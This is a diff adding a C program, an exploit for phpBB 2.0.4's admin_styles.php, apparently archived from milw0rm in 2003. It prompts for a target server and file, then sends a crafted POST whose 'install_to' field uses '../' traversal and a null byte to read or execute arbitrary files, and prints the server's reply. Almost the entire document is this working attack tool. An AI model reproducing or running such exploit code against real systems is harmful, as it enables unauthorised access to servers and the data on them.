@@ -1,0 +1,176 @@
+/***********************************************************/
+/* phpBB 2.0.4 Remote Admin_Styles.PHP Theme_Info.CFG File Include  */
+/*                                                                                                    */
+/*                Exploit made on June 2003 by Spoofed Existence               */
+/*                                                                                                    */
+/*       Patch : http://www.phpbb.com/phpBB/viewtopic.php?t=113826      */
+/***********************************************************/
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+int main()
+{
+ //The socket stuff
+ struct hostent *hp;
+ struct sockaddr_in sa;
+ int sock;
+
+ //The input stuff
+ char server[100];
+ char location[100];
+ char sfile[100];
+ int escapes;
+ char* file;
+
+ //The request stuff
+ char* request;
+ char* postdata;
+ char* header;
+
+ //The buffer to store the response
+ char buffer[4096];
+ int tworeturns = 0;
+ int showing = 0;
+
+ //Other
+ int i;
+
+ //Ask the server
+ printf("Server: ");
+ scanf("%100s", server);
+ printf("Forum location: ");
+ scanf("%100s", location);
+ printf("Directories to escape: ");
+ scanf("%i", &escapes);
+ printf("File to get/execute: ");
+ scanf("%100s", sfile);
+
+
+ //Start the exploit!
+ printf("\n\nStarting the exploit...\n");
+
+ //Connect to the server
+ printf("Creating socket... ");
+ if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+ {
+  printf("Failed!\n");
+  return 0;
+ } else{ printf("Done!\n");
+ }
+
+
+ printf("Looking up server IP... ");
+ if((hp = gethostbyname((char*)server)) == NULL)
+ {
+  printf("Failed!\n");
+  return 0;
+ } else { printf("Done!\n");
+ }
+
+
+ printf("Connecting %s:80... ", server);
+ memcpy(&sa.sin_addr, hp->h_addr_list[0], hp->h_length);
+ sa.sin_family = AF_INET;
+ sa.sin_port = htons(80);
+ if(connect(sock, (struct sockaddr*)&sa, sizeof(sa)))
+ {
+  printf("Failed!\n");
+  return 0;
+ } else { printf("Done!\n");
+ }
+
+
+ //Create the request
+ printf("Building request... ");
+
+ //Create the postdata
+ file = (char*)malloc(sizeof(char) * (escapes * 3 + strlen(sfile) + 1));
+
+ while(escapes > 0)
+ {
+  if(escapes == 1)
+  {
+   sprintf(file, "%s%s%s", file, "..", sfile);
+  } else { sprintf(file, "%s%s", file, "../");
+  }
+
+  escapes --;
+ }
+
+ postdata = (char*)malloc((27 + strlen(file)) * sizeof(char));
+ sprintf(postdata, "send_file= &install_to=%s%s00", file, "%");
+
+ header = (char*)malloc((170 + strlen(server) + strlen(location)) *
+sizeof(char));
+ sprintf(header, "POST /%s/admin/admin_styles.php?mode=addnew
+HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost:
+%s\r\nContent-Length: %i\r\nConnection: close\r\n\r\n", location, server,
+strlen(postdata));
+
+ request = (char*)malloc((strlen(postdata) + strlen(header) + 1) *
+sizeof(char));
+ sprintf(request, "%s%s", header, postdata);
+
+ printf("Done!\n");
+
+
+ //Send the request
+ printf("Sending request... ");
+ write(sock, request, strlen(request));
+ printf("Done!\n");
+
+ printf("\nResponse:\n");
+ //Get the response
+ while(recv(sock, buffer, 4096, 0) != 0)
+ {
+  for(i = 0; i < strlen(buffer); i++)
+  {
+   //Only show the character when it should
+   if(showing == 1)
+   {
+    printf("%c", buffer[ i ]);
+   }
+
+
+   //Stop showing from \n<br>\n
+   if(buffer[ i ] == '\n' && buffer[i + 1] == '<' && buffer[i + 2] == 'b' &&
+buffer[i + 3] == 'r' && buffer[i + 4] == '>' && buffer[i + 5] == '\n' &&
+showing == 1)
+   {
+    showing = 0;
+    tworeturns = 0;
+   }
+   //Or from \n<br />\n
+   if(buffer[ i ] == '\n' && buffer[i + 1] == '<' && buffer[i + 2] == 'b' &&
+buffer[i + 3] == 'r' && buffer[i + 4] == ' ' && buffer[i + 5] == '/' &&
+buffer[i + 6] == '>' && buffer[i + 7] == '\n' && showing == 1)
+   {
+    showing = 0;
+    tworeturns = 0;
+   }
+
+   //If there's a return and tworeturns = true, start showing it
+   if(buffer[ i ] == '\n' && tworeturns == 1)
+   {
+    showing = 1;
+   }
+
+   //If there are two returns, set tworeturns to true and add 3 to i
+   if(buffer[ i ] == '\r' && buffer[i + 1] == '\n' && buffer[i + 2] == '\r'
+&& buffer[i + 3] == '\n')
+   {
+    tworeturns = 1;
+    i += 3;
+   }
+  }
+ }
+ printf("\n");
+
+ return 0;
+}
+
+// milw0rm.com [2003-06-30]
